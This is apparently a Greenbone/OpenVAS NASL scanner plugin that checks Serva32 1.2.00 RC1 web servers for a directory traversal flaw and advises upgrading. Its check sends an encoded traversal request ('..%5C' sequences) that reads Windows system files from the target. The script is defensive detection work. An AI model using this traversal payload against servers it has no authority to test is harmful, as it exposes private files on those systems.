if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103160" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-05-12 13:24:44 +0200 (Thu, 12 May 2011)" );
	script_bugtraq_id( 47760 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Serva32 Directory Traversal and Denial of Service Vulnerabilities" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/47760" );
	script_xref( name: "URL", value: "http://www.vercot.com/~serva/" );
	script_category( ACT_ATTACK );
	script_family( "Web Servers" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Serva32/banner" );
	script_tag( name: "impact", value: "Exploiting these issues will allow attackers to obtain sensitive
 information or cause denial-of-service conditions." );
	script_tag( name: "affected", value: "Serva32 1.2.00 RC1 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "Upgrade to Serva32 Version 1.2.1 or later." );
	script_tag( name: "summary", value: "Serva32 is prone to a directory-traversal vulnerability and a denial-of-
 service vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: Serva32" )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	url = "/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/" + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

